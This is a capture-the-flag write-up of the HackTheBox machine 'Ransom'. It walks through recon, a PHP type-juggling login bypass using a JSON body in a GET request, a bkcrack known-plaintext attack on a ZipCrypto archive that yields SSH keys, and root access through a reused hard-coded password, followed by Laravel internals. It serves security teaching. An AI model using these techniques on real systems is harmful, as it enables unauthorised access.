---
title: HTB: Ransom
url: https://0xdf.gitlab.io/2022/03/15/htb-ransom.html
date: 2022-03-15T09:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, hackthebox, htb-ransom, uhc, nmap, type-juggling, ubuntu, php, laravel, feroxbuster, burp, burp-repeater, zipcrypto, known-plaintext, crypto, bkcrack
---

![Ransom](https://0xdfimages.gitlab.io/img/ransom-cover.png)

Ransom was a UHC qualifier box, targeting the easy to medium range. It has three basic steps. First, I’ll bypass a login screen by playing with the request and type juggling. Then I’ll access files in an encrypted zip archive using a known plaintext attack and bkcrypt. Finally, I’ll find credentials in HTML source that work to get root on the box. In Beyond Root, I’ll look at the structure of a Laravel application, examine how the api requests were handled and how I managed to get JSON data into a GET request, and finally look at the type juggling, why it worked, and how to fix it.

## Box Info

| Name | [Ransom](https://hackthebox.com/machines/ransom)  [Ransom](https://hackthebox.com/machines/ransom) [Play on HackTheBox](https://hackthebox.com/machines/ransom) |
| --- | --- |
| Release Date | 15 Mar 2022 |
| Retire Date | 15 Mar 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [ippsec ippsec](https://app.hackthebox.com/users/3769) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.153
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-08 11:18 UTC
Nmap scan report for 10.10.11.153
Host is up (0.092s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.04 seconds
oxdf@hacky$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.153
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-08 11:20 UTC
Nmap scan report for 10.10.11.153
Host is up (0.093s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title:  Admin - HTML5 Admin Template
|_Requested resource was http://10.10.11.153/login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.96 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 focal.

### Website - TCP 80

#### Site

Visiting the website in Firefox redirects to `/login`, which presents a form for the E Corp Incident Response Secure File Transfer:

![image-20220308065611668](https://0xdfimages.gitlab.io/img/image-20220308065611668.png)

Guessing at some passwords like “admin” and simple SQL injections like “’ or 1=1;– -“ just add a banner over the password field:

![image-20220308065735357](https://0xdfimages.gitlab.io/img/image-20220308065735357.png)

It is clear that the application is not fully reloading the page on submitting the password, but rather JavaScript is sending the request and updating the page based on the result.

#### Tech Stack

Looking at my first request to `/`, not only does the response return a 302 redirect to `/login`, but it also sets a `laravel_session` cookie:

```

HTTP/1.1 302 Found
Date: Tue, 08 Mar 2022 11:35:16 GMT
Server: Apache/2.4.41 (Ubuntu)
Cache-Control: no-cache, private
Location: http://10.10.11.153/login
Set-Cookie: XSRF-TOKEN=eyJpdiI6Ik94TG4xcmRBaElUalFub1N3bDRJM1E9PSIsInZhbHVlIjoiOHBaT2FhcG9TVVJ6cmxzUlhqSXZlMDhOVHJySG85RC9KT0JTb2ZYajhhcTJjNUxINU1YdTdTeEdBUGtVRzR5TGtJT1ZMWW9vRTBTbzFHZVBzMEgyTTcvbFljMVdNNDVDYmJ5RStKWmJ6aTRQSHFnUWdqVTJPa2xUVUw2bVBiR1EiLCJtYWMiOiI2MmRiOWVjZTY3MTU2YzM0ZTAzZjdlMTJhMmZhZmM3MDg1Njc2N2YxZmYwZjg3ZmE4MzU2MmVjOTFiMTk1NmIwIiwidGFnIjoiIn0%3D; expires=Tue, 08-Mar-2022 13:35:16 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6ImZjM2NGcW9pUkxNT0xJNXhEUk1GQ3c9PSIsInZhbHVlIjoiczNMOS9YT2pUOE1waFI2THgrRWdBQUpxR2NzUUw2ZC91Ri91enFzMCtYT3ZmRzQxbGZib3NmTW1oam5nbWJhVUswcFp6d2c3czN3ajJCTXROU3lPYXA0SHRVR1hPZFFZemltVmVHUEtoQTlST0ZCNkZvYmJKZElVNmlSYTd2R2kiLCJtYWMiOiI2MGJkNTJjOGU4MjUzYjhjYjBiZGM5M2Q3MjcxYWYwZjc2YjZkNDkyYTRiNjcxODEwN2U1YjMxNjI5MzJlY2ZmIiwidGFnIjoiIn0%3D; expires=Tue, 08-Mar-2022 13:35:16 GMT; Max-Age=7200; path=/; samesite=lax
Content-Length: 346
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='http://10.10.11.153/login'" />

        <title>Redirecting to http://10.10.11.153/login</title>
    </head>
    <body>
        Redirecting to <a href="http://10.10.11.153/login">http://10.10.11.153/login</a>.
    </body>
</html>

```

[Laravel](https://laravel.com/) is a PHP framework.

The password submission happens without a full page reload. It sends a GET to `/api/login?password=[password]`:

```

GET /api/login?password=password HTTP/1.1
Host: 10.10.11.153
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://10.10.11.153/login
Cookie: XSRF-TOKEN=eyJpdiI6IlNCNUU5WGNOY2ZYZDQ1UkloTTNiS0E9PSIsInZhbHVlIjoicUdNU3o2Z0k1ajcyT3lSbUFWemt2c1ZkWm1DTG1sTVIxUHAxK3RmMVh0cjFlVkNBY0huZllKQThQSVp5K2xGOTJKSER6Snp5V2o1QmZZUGpKMGc3eVNmSVA5RllGWGRTblEvdHZQNHk0NXlHcFBHYW5JM0tzVmowSGNKb1VwSzMiLCJtYWMiOiIwMmJhOTBhNTk3OWM0ZjU3Yjg2OTg1YTZiYjMwY2IwZTYxMGVlZWE2NTQ1MzQwNmU1NmI1OGUyZDU2ODM0NDAyIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlpGNDIvK0RmRHFiQWFMWFpXQVYrTUE9PSIsInZhbHVlIjoiRHBEdE16VkN4ZVExazhvd21nc2RBenJOSDcyOXhSVzhUdTI1dzlPdG1DUGxUL1U0TFJMWnY3aDRkVkxXN3lJaWJkRUpSMFZHNWk4YU1uaTh2L1RQRGlIMCt3VEdQbzR2NytvVWNqS1NXNGNCZlFTVE40dExSUlhraUY3WGtKMSsiLCJtYWMiOiIwODIxYzNjYTVmYTQ1NzEwMjM0NjY0OTFiM2QwZjI0OTJlNDdlNzQ3NTJiMWU1ZWMxYjkwY2RlZDUzMWYwZWFiIiwidGFnIjoiIn0%3D

```

It’s a bit odd (and poor practice) to see a password going in a GET request. This risks the password itself being logged in the webserver logs and browser history. So while it is bad practice, it isn’t something that helps me to exploit the server.

I’ll take a peak at the JS on the page that’s managing password submission:

```

<script>
$(document).ready(function() {

  $('#loginform').submit(function() {

      $.ajax({
          type: "GET",
          url: 'api/login',
          data: {
              password: $("#password").val()
          },
          success: function(data)
          {
              if (data === 'Login Successful') {
                  window.location.replace('/');
              }
              else {
                (document.getElementById('alert')).style.visibility = 'visible';
                document.getElementById('alert').innerHTML = 'Invalid Login';

              }
          }
      });     
      return false; 
  });
});
</script>

```

When the `#loginform` is submitted, it generates a GET request to `api/login` with the password, and based on the reply, it either reloads the page at `/`, or makes the warning section visible and sets the message.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since the site is PHP-based:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.153 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.153
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
...[snip]...
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_11_153-1646742181.state ...
[###>----------------] - 30m    79010/479984  2h      found:11      errors:3859   
[####>---------------] - 30m    12154/59998   6/s     http://10.10.11.153 
[####>---------------] - 30m    12036/59998   6/s     http://10.10.11.153/css 
[####>---------------] - 30m    12042/59998   6/s     http://10.10.11.153/js 
[###>----------------] - 30m    11860/59998   6/s     http://10.10.11.153/css/lib 
[###>----------------] - 30m    11844/59998   6/s     http://10.10.11.153/js/lib 
[###>----------------] - 30m    11584/59998   6/s     http://10.10.11.153/fonts 
[#>------------------] - 8m      5282/59998   10/s    http://10.10.11.153/js/lib/gmap 
[#>------------------] - 6m      3982/59998   9/s     http://10.10.11.153/js/init

```

After a while I’ll kill it because it goes quite slow, and isn’t finding anything intereting.

## Shell as htb

### Bypass Login

I noted above that the login request is a GET request. I’ll send it to Repeater, right-click, and select “Change Request Method”, it will become a POST request. Sending that fails:

[![image-20220311170734019](https://0xdfimages.gitlab.io/img/image-20220311170734019.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220311170734019.png)

405 Method Not Allowed suggests the application is not looking for POST requests on this endpoint.

But there’s more I can try here. I’ll manually replace the word POST with GET, but leave the `password` in the POST body:

[![image-20220311170836856](https://0xdfimages.gitlab.io/img/image-20220311170836856.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220311170836856.png)

It’s giving an error that “The password field is required”. So it’s not processing the password field in the body. That makes sense for a GET request.

The response is JSON. I’ll try changing this request body to JSON. The logic here is that it’s nearly impossible to put JSON in a GET request, so if I change the `Content-Type` header to say `application/json`, then it may process the body even in a GET request. It worked!

[![image-20220311171038216](https://0xdfimages.gitlab.io/img/image-20220311171038216.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220311171038216.png)

It isn’t the right password, but the JSON data in the body is being processed.

I’ll look at the Laravel setup of this application in [Beyond Root](#request-handling).

Having JSON data presents other opportunities, like type juggling. I’ll replace the string that represents the submitted password with `true`:

[![image-20220311171210728](https://0xdfimages.gitlab.io/img/image-20220311171210728.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220311171210728.png)

“Login Successful”! I’ll dig more into the [type juggling in Beyond Root](#type-juggling) as well.

My session is now logged in on the server, so just going back to Firefox and visiting `http://10.10.11.153` now returns the page without redirecting:

![image-20220311172912724](https://0xdfimages.gitlab.io/img/image-20220311172912724.png)

The `user.txt` file is the first flag:

![image-20220311172936604](https://0xdfimages.gitlab.io/img/image-20220311172936604.png)

### homedirectory.zip

Downloading the `homedirectory.zip` link saves a file named `uploaded-file-3422.zip`. It is a Zip archive, and it looks to have a home directory, including SSH keys:

```

oxdf@hacky$ file uploaded-file-3422.zip 
uploaded-file-3422.zip: Zip archive data, at least v2.0 to extract
oxdf@hacky$ unzip -l uploaded-file-3422.zip 
Archive:  uploaded-file-3422.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      220  2020-02-25 12:03   .bash_logout
     3771  2020-02-25 12:03   .bashrc
      807  2020-02-25 12:03   .profile
        0  2021-07-02 18:58   .cache/
        0  2021-07-02 18:58   .cache/motd.legal-displayed
        0  2021-07-02 18:58   .sudo_as_admin_successful
        0  2022-03-07 12:32   .ssh/
     2610  2022-03-07 12:32   .ssh/id_rsa
      564  2022-03-07 12:32   .ssh/authorized_keys
      564  2022-03-07 12:32   .ssh/id_rsa.pub
     2009  2022-03-07 12:32   .viminfo
       32  2022-03-07 12:33   user.txt
---------                     -------
    10577                     12 files

```

It won’t unzip without a password:

```

oxdf@hacky$ unzip uploaded-file-3422.zip
Archive:  uploaded-file-3422.zip
[uploaded-file-3422.zip] .bash_logout password:

```

7zip has a way to show more information about the files in the zip, using `l` for list, and `-slt` (which “Sets technical mode for l (list) command”, according to the [man page](https://linux.die.net/man/1/7z)). This gives a ton of information about each file in the archive:

```

oxdf@hacky$ 7z l -slt uploaded-file-3422.zip 
                                                    
7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 9 5900X 12-Core Processor             (A20F10),ASM,AES-NI)
                                                    
Scanning the drive for archives:                    
1 file, 7939 bytes (8 KiB)    
                                                    
Listing archive: uploaded-file-3422.zip
--                            
Path = uploaded-file-3422.zip
Type = zip                    
Physical Size = 7939      
----------               
Path = .bash_logout
Folder = -                                          
Size = 220      
Packed Size = 170                                   
Modified = 2020-02-25 12:03:22
Created =                                           
Accessed =                    
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = 6CE3189B
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0

Path = .bashrc
Folder = -
...[snip]...

```

It is using ZipCrypto to encrypt the files.

### Decrypt Zip

#### Background

There’s a known plaintext attack against encrypted Zip archives. This attack isn’t new, but it recently made it’s way around InfoSec Twitter because of this post: [How I Cracked CONTI Ransomware Group’s Leaked Source Code ZIP File](https://medium.com/@whickey000/how-i-cracked-conti-ransomware-groups-leaked-source-code-zip-file-e15d54663a8).

The legacy zip encryption is an algorithm referred to as “ZipCrypto”. Modern zip clients will use AES 256. The attack used here will only work against ZipCrypto.

The attack involves finding a file with the same text as any file in the archive, and abusing that to recover the entire archive, and potentially even the password.

#### Find Known Plaintext

Of the files in the archive, `.bash_logout` seems like a good candidate. `user.txt` could work, but with HTB flag rotation, it actually won’t. `.bash_logout` is a file that is not commonly changed. The one in the zip is 220 bytes. So is the one on my Ubuntu system:

```

oxdf@hacky$ ls -la .bash_logout 
-rw-r--r-- 1 oxdf oxdf 220 Jan 25 15:18 .bash_logout

```

Looking at the output again from `7z l -slt uploaded-file-3422.zip` for this file:

```

Path = .bash_logout
Folder = -                                          
Size = 220      
Packed Size = 170                                   
Modified = 2020-02-25 12:03:22
Created =                                           
Accessed =                    
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = 6CE3189B
Method = ZipCrypto Deflate
Host OS = Unix
Version = 20
Volume Index = 0

```

The Method is ZipCrypto, which is the less secure algorithm. The CRC32 from the Zip output above is 6CE3189B. That is a CRC of the decrypted file, used after decryption to verify the correct file resulted.

I can calculate the CRC32 of the `.bash_logout` file on my system with Python and `binascii`:

```

oxdf@hacky$ python3
Python 3.8.10 (default, Nov 26 2021, 20:14:08) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import binascii
>>> with open('/home/oxdf/.bash_logout', 'rb') as f:
...     data = f.read()
... 
>>> data
b'# ~/.bash_logout: executed by bash(1) when login shell exits.\n\n# when leaving the console clear the screen to increase privacy\n\nif [ "$SHLVL" = 1 ]; then\n    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q\nfi\n'
>>> hex(binascii.crc32(data) & 0xFFFFFFFF)
'0x6ce3189b'

```

That’s a match!

#### bkcrack

[bkcrack](https://github.com/kimci86/bkcrack) is a tool for executing this attack. I’ll need to give it:
- `-C`: the encrypted zip file
- `-c`: the name of the encrypted but known file in the zip
- `-P`: an unencrypted zip with the file in it
- `-p`: the name of the file in the unencrypted zip

I’ll create the plaintext zip:

```

oxdf@hacky$ cp ~/.bash_logout bash_logout
oxdf@hacky$ zip plain.zip bash_logout 
  adding: bash_logout (deflated 28%)

```

Now I’ll run `bkcrack`, and after about a minute, it returns the internal keys:

```

oxdf@hacky$ /opt/bkcrack/bkcrack -C uploaded-file-3422.zip -c .bash_logout -P plain.zip -p bash_logout 
bkcrack 1.3.5 - 2022-03-06
[00:51:00] Z reduction using 150 bytes of known plaintext
100.0 % (150 / 150)
[00:51:01] Attack on 54969 Z values at index 7
Keys: 6230b158 1cf90fe7 97778c9c
78.8 % (43342 / 54969)
[00:51:49] Keys
6230b158 1cf90fe7 97778c9c

```

The easiest thing to do from here is to run `bkcrack` again, this time using:
- `-C`: encrypted archive
- `-k`: keys from above
- `-U`: output archive name
- `password`: output archive password

This one runs instantly:

```

oxdf@hacky$ /opt/bkcrack/bkcrack -C uploaded-file-3422.zip -k 6230b158 1cf90fe7 97778c9c -U uploaded-file-3422-pass.zip pass
bkcrack 1.3.5 - 2022-03-06
[00:54:01] Writing unlocked archive uploaded-file-3422-pass.zip with password "pass"
100.0 % (10 / 10)
Wrote unlocked archive.

```

Now I can decrypt the resulting archive with the password “pass”:

```

oxdf@hacky$ unzip uploaded-file-3422-pass.zip -d unzipped/
Archive:  uploaded-file-3422-pass.zip
[uploaded-file-3422-pass.zip] .bash_logout password: 
  inflating: unzipped/.bash_logout   
  inflating: unzipped/.bashrc        
  inflating: unzipped/.profile       
   creating: unzipped/.cache/
 extracting: unzipped/.cache/motd.legal-displayed  
 extracting: unzipped/.sudo_as_admin_successful  
   creating: unzipped/.ssh/
  inflating: unzipped/.ssh/id_rsa    
  inflating: unzipped/.ssh/authorized_keys  
  inflating: unzipped/.ssh/id_rsa.pub  
  inflating: unzipped/.viminfo       
 extracting: unzipped/user.txt  

```

### SSH

The public key in the archive ends with “htb@ransom”:

```

oxdf@hacky$ cat unzipped/.ssh/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrDTHWkTw0RUfAyzj9U3Dh+ZwhOUvB4EewA+z6uSunsTo3YA0GV/j6EaOwNq6jdpNrb9T6tI+RpcNfA+icFj+6oRj8hOa2q1QPfbaej2uY4MvkVC+vGac1BQFs6gt0BkWM9JY7nYJ2y0SIibiLDDB7TwOx6gem4Br/35PW2sel8cESyR7JfGjuauZM/DehjJJGfqmeuZ2Yd2Umr4rAt0R4OEAcWpOX94Tp+JByPAT5m0CU557KyarNlW60vy79njr8DR8BljDtJ4n9BcOPtEn+7oYvcLVksgM4LB9XzdDiXzdpBcyi3+xhFznFKDYUf6NfAud2sEWae7iIsCYtmjx6Jr9Zi2MoUYqWXSal8o6bQDIDbyD8hApY5apdqLtaYMXpv+rMGQP5ZqoGd3izBM9yZEH8d9UQSSyym/te07GrCax63tb6lYgUoUPxVFCEN4RmzW1VuQGvxtfhu/rK5ofQPac8uaZskY3NWLoSF56BQqEG9waI4pCF5/Cq413N6/M= htb@ransom

```

I’ll assume that’s the username. It works:

```

oxdf@hacky$ ssh -i unzipped/.ssh/id_rsa htb@10.10.11.153
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-77-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.

Last login: Tue Mar  8 19:01:53 2022 from 10.10.14.8
htb@ransom:~$

```

## Shell as root

### Enumeration

#### Identify Web Directory

`nmap` identified Apache running on TCP 80. There’s a single site config file:

```

htb@ransom:/$ ls /etc/apache2/sites-enabled/
000-default.conf

```

It shows the web root running out of `/srv/prod`:

```

<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /srv/prod/public

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
            <Directory /srv/prod/public>
               Options +FollowSymlinks
               AllowOverride All
               Require all granted
            </Directory>

</VirtualHost>

```

#### Identify Framework

I noted during enumeration that there was a `laravel_session` cookie set on visiting the page. There are further clues to show that is the framework in use on this site.

[Composer](https://getcomposer.org/) is a package / dependency manager for PHP, so the `composer.json` file is a good place to look at how the application is set up. Right at the top of the file there are references to Laravel:

```

{
    "name": "laravel/laravel",
    "type": "project",
    "description": "The Laravel Framework.",
    "keywords": ["framework", "laravel"],
    "license": "MIT",
    "require": {
        "php": "^7.3|^8.0",
        "fruitcake/laravel-cors": "^2.0",
        "guzzlehttp/guzzle": "^7.0.1",
        "laravel/framework": "^8.75",
        "laravel/sanctum": "^2.11",
        "laravel/tinker": "^2.5"       
    },
    "require-dev": {
        "facade/ignition": "^2.5",
        "fakerphp/faker": "^1.9.1",
        "laravel/sail": "^1.0.1",
        "mockery/mockery": "^1.4.4",
        "nunomaduro/collision": "^5.10",
        "phpunit/phpunit": "^9.5.10"
    },
    "autoload": {
...[snip]...

```

`README.md` is also all about Laravel. `server.php` is a standard Laravel file as well:

```

<?php

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
);

// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}

require_once __DIR__.'/public/index.php';

```

#### Find Password

I’ll do a deeper dive into the structure of a Laravel application in [Beyond Root](#structure-of-a-laravel-application). The quick way to find where the login auth happens is with `grep`, looking for the messages in the response:

```

htb@ransom:/srv/prod$ grep -r "Invalid Password" .
./app/Http/Controllers/AuthController.php:        return "Invalid Password";

```

That message comes from this function:

```

    /**
     * Handle account login
     * 
     */
    public function customLogin(Request $request)
    {
        $request->validate([
            'password' => 'required',
        ]);

        if ($request->get('password') == "UHC-March-Global-PW!") {
            session(['loggedin' => True]);
            return "Login Successful";
        }

        return "Invalid Password";
    }

```

The password is hard-coded as “UHC-March-Global-PW!”.

### su / ssh

That happens to be the root password as well, working for `su`:

```

htb@ransom:/$ su -
Password: 
root@ransom:~# 

```

And for ssh:

```

oxdf@hacky$ sshpass -p 'UHC-March-Global-PW!' ssh root@10.10.11.153
...[snip]...
root@ransom:~#

```

And I can grab `root.txt`:

```

root@ransom:~# cat root.txt
d1c64eca************************

```

## Beyond Root

### Structure of a Laravel Application

Like many web frameworks, Laravel uses the concept of a route to tie a web url endpoint to a function that will handle that. In something like Python Flask, that involves putting a decorator on the function:

```

@app.route('/')
def index():
    return 'Web App with Python Flask!'

```

In Laravel, there’s a `routes` folder at the base of the application:

```

htb@ransom:/srv/prod$ ls routes/
api.php  channels.php  console.php  web.php

```

I can list all the routes using `artisan`, the [command line interface included with Laravel](https://laravel.com/docs/9.x/artisan):

```

htb@ransom:/srv/prod$ php artisan route:list
+--------+----------+---------------------+----------+------------------------------------------------------------+------------+
| Domain | Method   | URI                 | Name     | Action                                                     | Middleware |
+--------+----------+---------------------+----------+------------------------------------------------------------+------------+
|        | GET|HEAD | /                   |          | App\Http\Controllers\TasksController@index                 | web        |
|        | GET|HEAD | api/login           | apilogin | App\Http\Controllers\AuthController@customLogin            | api        |
|        | GET|HEAD | login               | login    | App\Http\Controllers\AuthController@show_login             | web        |
|        | GET|HEAD | sanctum/csrf-cookie |          | Laravel\Sanctum\Http\Controllers\CsrfCookieController@show | web        |
+--------+----------+---------------------+----------+------------------------------------------------------------+------------+

```

The output shows the method and uri that pair with some “Action”, which is a path to a controller and the function in that controller that handles that method/uri.

Looking at `routes/web.php`, it imports the controller classes using `use` (like `import` in Python), and then ties them together with a `Route` object:

```

<?php

use App\Http\Controllers\TasksController;
use App\Http\Controllers\AuthController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', [TasksController::class, 'index']);
Route::get('/login', [AuthController::class, 'show_login'])->name('login');

```

So `/login` is now connected to The `AuthController` class’ `show_login` function. Sometimes you’ll see the function written as `[class]@[function]`. Optionally, the `Route` object can be assigned a name. In PHP, `->` is the object operator, used to access parameters and methods of the object. So everything up to that operator is creating a `Route` object, and then we’re calling the `name` method of the result, passing in the name we want. When no name is given, it gets a name like `generated::r52gIYGkbT8B5tOM`.

### Request Handling

I identified some odd behavior with the application above, where it only accepted GET requests, but if would read JSON data out of the POST body just like it was a GET parameter. I can look at that now and see how much of that I can explain.

#### 405 for POST

First, it’s clear why the application returned a 405 Method Not Allowed when I tried to send a POST request to `/login`. The login GET request went to `/api/login`, which is defined in `routes/api.php`:

```

Route::get('/login', [AuthController::class, 'customLogin'])->name('apilogin');

```

This maps the function to handle GET and HEAD requests. There were no routes defined for POST, so it returns 405, saying that uri is defined, but not for this method.

As root, I can write to these files. I’ll change that route to `post`:

```

Route::post('/login', [AuthController::class, 'customLogin'])->name('apilogin');

```

Now it works as a POST:

[![image-20220312072624255](https://0xdfimages.gitlab.io/img/image-20220312072624255.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220312072624255.png)

And fails as a GET:

[![image-20220312072640952](https://0xdfimages.gitlab.io/img/image-20220312072640952.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220312072640952.png)

If I update the route to the following, both work:

```

Route::match(['GET', 'POST'], '/login', [AuthController::class, 'customLogin'])->name('apilogin');

```

#### JSON Data in GET - Source Analysis

I looked at the `customLogin` function above to get the password. This time I’m interested in the data being passed into the function, the `Request` object `$request`:

```

    public function customLogin(Request $request)
    {
        $request->validate([
            'password' => 'required',
        ]);

        return $request;

        if ($request->get('password') == "UHC-March-Global-PW!") {
            session(['loggedin' => True]);
            return "Login Successful";
        }
  
        return "Invalid Password";
    }

```

The Laravel version is 8.83.1:

```

htb@ransom:/srv/prod$ php artisan --version
Laravel Framework 8.83.1

```

The [Laravel API docs](https://laravel.com/api/8.x/Illuminate/Http/Request.html#method_get) for 8.x have a reference for `get`:

![image-20220312103039611](https://0xdfimages.gitlab.io/img/image-20220312103039611.png)

The source for this function is [here](https://github.com/laravel/framework/blob/8.x/src/Illuminate/Http/Request.php#L360-L371), showing that it just calls the parent’s `get`:

```

    public function get(string $key, $default = null)
    {
        return parent::get($key, $default);
    }

```

Up at [line 20](https://github.com/laravel/framework/blob/8.x/src/Illuminate/Http/Request.php#L20) in that same file, the `Request` class is created, extending `SymfonyReqeust`:

```

class Request extends SymfonyRequest implements Arrayable, ArrayAccess

```

The [Symfony docs](https://symfony.com/doc/current/components/http_foundation.html) don’t have that much to say about `get`, but there’s a link to the [source](https://github.com/symfony/symfony/blob/6.0/src/Symfony/Component/HttpFoundation/ParameterBag.php#L77-L80). This code is super simple as well:

```

    public function get(string $key, mixed $default = null): mixed
    {
        return \array_key_exists($key, $this->parameters) ? $this->parameters[$key] : $default;
    }

```

This function is part of the `ParameterBag` class. I’m not going to go much further down this rabbit hole, other than to say, it’s clear the framework is handling the stuff submitted to the request in a very complicated way, and it’s not surprising that perhaps even stuff passed in the body could be parsed and accessible.

#### JSON Data in GET - Debugging

One way to debug in Laravel is to insert `dd($var)`, and then the contents of `$var` will be dumped in the return at that point in the code. I’ll try it, adding `dd($request);` to the top of the `customLogin` function. Now I’ll visit `http://10.10.11.153/api/login?password=0xdfpass`, and the page returns:

[![image-20220312103952923](https://0xdfimages.gitlab.io/img/image-20220312103952923.png)](https://0xdfimages.gitlab.io/img/image-20220312103952923.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220312103952923.png)

It’s interesting to note that there’s a `ParameterBag` in `attributes` and an `InputBag` in `request` and `query`, as well as a few other Symfony “bags”. I can’t completely explain how `get` is reaching into the `InputBag`, but it clearly is, as that’s the intended behavior.

I’ll turn on Burp intercept, refresh, and modify the request, adding the `Content-type: application/json` header and a JSON body with some test parameters. Now the `json` part of the `Request` has those values in another `ParameterBag`:

[![image-20220312104325584](https://0xdfimages.gitlab.io/img/image-20220312104325584.png)](https://0xdfimages.gitlab.io/img/image-20220312104325584.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220312104325584.png)

This explains how the `get` function is seeing it, at least partially. I’m not sure where the code is looping over these various “bags”, but it must be somewhere.

If I submit one with the password argument in both the GET parameter and in JSON, and it shows that both make it to the `Request` object:

[![](https://0xdfimages.gitlab.io/img/image-20220312104847817.png)](https://0xdfimages.gitlab.io/img/image-20220312104847817.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220312104847817.png)

I am curious which one takes priority, so I’ll remove the `dd` call and let it run like normal, and resubmit that request in Burp Repeater. It seems that the GET param takes precedence:

![image-20220312111257653](https://0xdfimages.gitlab.io/img/image-20220312111257653.png)

Switching them results in a failed login.

### Type Juggling

#### Value of password

Now understanding how the variable is getting to the function, I’ll look at the type juggling bypass.

I’ll use `dd($request->get('password'))`, as that’s what’s going into the comparson. With a string, it returns just the string:

![image-20220312111947552](https://0xdfimages.gitlab.io/img/image-20220312111947552.png)

If I change it to `true` in the URL, it returns the string “true”:

![image-20220312112011438](https://0xdfimages.gitlab.io/img/image-20220312112011438.png)

If I use Burp to modify the request using JSON data, it returns the true object:

![image-20220312112040828](https://0xdfimages.gitlab.io/img/image-20220312112040828.png)

#### PHP Equals

To show how `==` works in PHP, I’ll open a PHP shell with `php -a`. I’ll create a test case:

```

